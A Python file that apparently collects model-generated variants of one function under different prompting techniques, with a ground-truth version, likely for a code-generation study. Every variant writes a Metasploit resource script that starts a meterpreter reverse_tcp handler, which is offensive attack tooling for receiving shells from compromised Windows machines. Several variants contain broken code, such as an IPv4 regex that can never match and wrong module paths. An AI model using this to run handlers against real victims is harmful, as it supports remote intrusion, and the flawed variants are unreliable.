import re
import os
import ipaddress
import logging 

def ground_truth_code_setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def persona__setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(int(lport)) + '\n')
            file.write('set LHOST ' + str(lhost) + '\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except Exception as e:
        pass

def template__setupHandler(configFile, lhost, lport):
	try:
		with open(configFile, 'w') as file:
			file.write('use exploit/multi/handler\n')
			file.write('set payload windows/meterpreter/reverse_tcp\n')
			file.write('set LPORT ' + str(lport) + '\n')
			file.write('set LHOST ' + lhost + '\n')
			file.write('exploit -j -z\n')
			file.write('setg DisablePayloadHandler 1\n')
	except Exception as e:
		pass

def question_refinement__setupHandler(lport, lhost):
    if not isinstance(lport, int) or not isinstance(lhost, str):
        raise ValueError('Invalid input type')
    if ':' in lhost or not (0 < lport < 65536):
        raise ValueError('Invalid payload handler configuration')
    config_content = f'use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT {lport}\nset LHOST {lhost}\nexploit -j -z\nsetg DisablePayloadHandler 1\n'
    with open('configFile.txt', 'w') as config_file:
        config_file.write(config_content)

def alternative_approaches__setupHandler(configFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
        raise ValueError('Invalid argument types')
    with open(configFile, 'w') as f:
        f.write(f'use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT {lport}\nset LHOST {lhost}\nexploit -j -z\nsetg DisablePayloadHandler 1\n')

def context_manager__setupHandler(configFile, lhost, lport):
	with open(configFile, 'w') as file:
		file.write('use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT {}\nset LHOST {}\nexploit -j -z\nsetg DisablePayloadHandler 1\n'.format(int(lport), str(lhost)))

def flipped_interaction_3__setupHandler(configFile, lhost, lport):
	with open(configFile, 'w') as file:
		file.write('use exploit/multi/handler\n')
		file.write('set payload windows/meterpreter/reverse_tcp\n')
		file.write('set LPORT ' + str(lport) + '\n')
		file.write('set LHOST ' + lhost + '\n')
		file.write('exploit -j -z\n')
		file.write('setg DisablePayloadHandler 1\n')

def flipped_interaction_4__setupHandler(configFile, lhost, lport):
    logging.basicConfig(filename='config_setup.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    if not validate_ip(lhost):
        logging.error(f"Invalid IP address: {lhost}")
        raise ValueError(f"The provided IP address '{lhost}' is invalid. Please provide a valid IPv4 or IPv6 address.")
    if not validate_port(lport):
        logging.error(f"Invalid port number: {lport}")
        raise ValueError(f"The provided port number '{lport}' is invalid. Please provide a port number between 1024 and 65535.")
    config_content = [
        'use exploit/multi/handler\n',
        'set payload windows/meterpreter/reverse_tcp\n',
        f'set LPORT {lport}\n',
        f'set LHOST {lhost}\n',
        'exploit -j -z\n',
        'setg DisablePayloadHandler 1\n'
    ]
    dir_path = os.path.dirname(configFile)
    if dir_path and not os.path.isdir(dir_path):
        logging.error(f"Directory does not exist: {dir_path}")
        raise IOError(f"The directory '{dir_path}' does not exist.")
    if dir_path and not os.access(dir_path, os.W_OK):
        logging.error(f"Directory is not writable: {dir_path}")
        raise IOError(f"The directory '{dir_path}' is not writable.")
    try:
        with open(configFile, 'w') as file:
            file.writelines(config_content)
        logging.info(f"Configuration file '{configFile}' has been successfully written.")
    except IOError as e:
        logging.error(f"Failed to write to file '{configFile}': {e}")
        raise IOError(f"Failed to write to file '{configFile}'. Error: {e}")

def flipped_interaction_5__setupHandler(configFile, lhost, lport):
	try:
		if not validate_ip_address(lhost):
			raise ValueError(f"Invalid IP address: {lhost}")
		if not isinstance(lport, int) or not (1024 <= lport <= 65535):
			raise ValueError(f"Invalid port number: {lport}. Port must be an integer between 1024 and 65535.")
		lines = [f'use exploit/multi/handler\n', f'set payload windows/meterpreter/reverse_tcp\n', f'set LPORT {lport}\n', f'set LHOST {lhost}\n', f'exploit -j -z\n', f'setg DisablePayloadHandler 1\n']
		with open(configFile, 'w') as config_file:
			config_file.writelines(lines)
	except ValueError as ve:
		print(f"ValueError: {ve}")
	except IOError as ioe:
		print(f"IOError: {ioe}")

def flipped_interaction_5__validate_ip_address(ip):
	IPv4_RE = re.compile(r'^(\\d{1,3}\\.){3}\\d{1,3}$')
	if not IPv4_RE.match(ip):
		return False
	octets = ip.split('.')
	for octet in octets:
		if not 0 <= int(octet) <= 255:
			return False
	return True

def iterative_prompting_3__setupHandler(configFile, lhost, lport):
    if not isinstance(configFile, str) or not configFile:
        raise ValueError('configFile must be a non-empty string')
    if not isinstance(lhost, str) or not lhost:
        raise ValueError('lhost must be a non-empty string')
    if not isinstance(lport, int) or not (0 < lport < 65536):
        raise ValueError('lport must be a valid integer between 1 and 65535')
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit\\multi\\handler\n')
            file.write('set payload windows\\meterpreter\\reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise Exception(f'An error occurred while writing to the file {configFile}: {e}')

def iterative_prompting_4__setupHandler(config_file, lhost, lport):
    if not isinstance(config_file, str) or not config_file.strip():
        raise ValueError('config_file must be a non-empty string.')
    if not isinstance(lhost, str) or not lhost.strip():
        raise ValueError('lhost must be a non-empty string.')
    if not isinstance(lport, int) or not (0 <= lport <= 65535):
        raise ValueError('lport must be an integer between 0 and 65535.')
    try:
        with open(config_file, 'w', encoding='utf-8') as file:
            file.write('use exploit\\/multi\\/handler\n')
            file.write('set payload windows\\/meterpreter\\/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise IOError('Failed to write to the configuration file: ' + str(e))

def iterative_prompting_5__setupHandler(configFile, lhost, lport):
    if not isinstance(configFile, str) or not configFile.endswith('.txt'):
        raise ValueError('configFile must be a valid file path ending with .txt')
    if not isinstance(lhost, str) or not (len(lhost.split('.')) == 4 and all(0 <= int(octet) <= 255 for octet in lhost.split('.'))):
        raise ValueError('lhost must be a valid IP address')
    if not isinstance(lport, int) or not 1 <= lport <= 65535:
        raise ValueError('lport must be an integer in the range 1 to 65535')
    try:
        with open(configFile, 'w') as f:
            f.write('use exploit\\multi\\handler\n')
            f.write('set payload windows\\meterpreter\\reverse_tcp\n')
            f.write('set LPORT ' + str(lport) + '\n')
            f.write('set LHOST ' + lhost + '\n')
            f.write('exploit -j -z\n')
            f.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise IOError('An error occurred while writing to the config file: ' + str(e))

def few_shots_prompting__setupHandler(configFile, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/multi/handler\n')
		f.write('set payload windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT ' + str(lport) + '\n')
		f.write('set LHOST ' + lhost + '\n')
		f.write('exploit -j -z\n')
		f.write('setg DisablePayloadHandler 1\n')

def cot_prompting__setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as config:
        config.write('use exploit/multi/handler\n')
        config.write('set payload windows/meterpreter/reverse_tcp\n')
        config.write('set LPORT ' + str(lport) + '\n')
        config.write('set LHOST ' + lhost + '\n')
        config.write('exploit -j -z\n')
        config.write('setg DisablePayloadHandler 1\n')

def fact_check_list__setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def not_interactive_mix__setupHandler(configFile, lhost, lport):
    import os
    import socket
    try:
        socket.inet_pton(socket.AF_INET, lhost)
    except socket.error:
        try:
            socket.inet_pton(socket.AF_INET6, lhost)
        except socket.error:
            raise ValueError("Invalid IP address")
    if not isinstance(lport, int) or not 1 <= lport <= 65535:
        raise ValueError("Invalid port number. Port must be an integer between 1 and 65535")
    if not isinstance(configFile, str):
        raise TypeError("The configuration file path must be a string")
    if os.path.exists(configFile) and not os.access(configFile, os.W_OK):
        raise PermissionError("The destination configuration file is not writable")
    config_lines = [
        'use exploit/multi/handler\n',
        'set payload windows/meterpreter/reverse_tcp\n',
        f'set LPORT {lport}\n',
        f'set LHOST {lhost}\n',
        'exploit -j -z\n',
        'setg DisablePayloadHandler 1\n'
    ]
    try:
        with open(configFile, 'w') as file:
            file.writelines(config_lines)
    except IOError as e:
        raise RuntimeError(f"An error occurred writing the configuration file: {e}")

def interactive_mix__writeConfigFile(configFilePath, lport, lhost):
    import socket
    import os
    if not isinstance(lport, int) or lport < 1 or lport > 65535:
        raise ValueError("Invalid port number. Port must be an integer between 1 and 65535.")
    def is_valid_ipv4_address(address):
        try:
            socket.inet_pton(socket.AF_INET, address)
            return True
        except AttributeError:
            try:
                socket.inet_aton(address)
            except socket.error:
                return False
            return address.count('.') == 3
        except socket.error:
            return False
    def is_valid_ipv6_address(address):
        try:
            socket.inet_pton(socket.AF_INET6, address)
        except socket.error:
            return False
        return True
    if not (is_valid_ipv4_address(lhost) or is_valid_ipv6_address(lhost)):
        raise ValueError("Invalid IP address format. Must be a valid IPv4 or IPv6 address.")
    config_contents = [
        'use exploit/multi/handler\n',
        f'set payload windows/meterpreter/reverse_tcp\n',
        f'set LPORT {lport}\n',
        f'set LHOST {lhost}\n',
        'exploit -j -z\n',
        'setg DisablePayloadHandler 1\n'
    ]
    try:
        with open(configFilePath, 'w') as file:
            file.writelines(config_contents)
        os.chmod(configFilePath, 0o600)
    except OSError as e:
        raise OSError(f"Failed to handle file permissions or write to the config file: {e}")

def baseline__setupHandler(configFile, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/multi/handler\n')
		f.write('set payload windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT ' + str(lport) + '\n')
		f.write('set LHOST ' + lhost + '\n')
		f.write('exploit -j -z\n')
		f.write('setg DisablePayloadHandler 1\n')
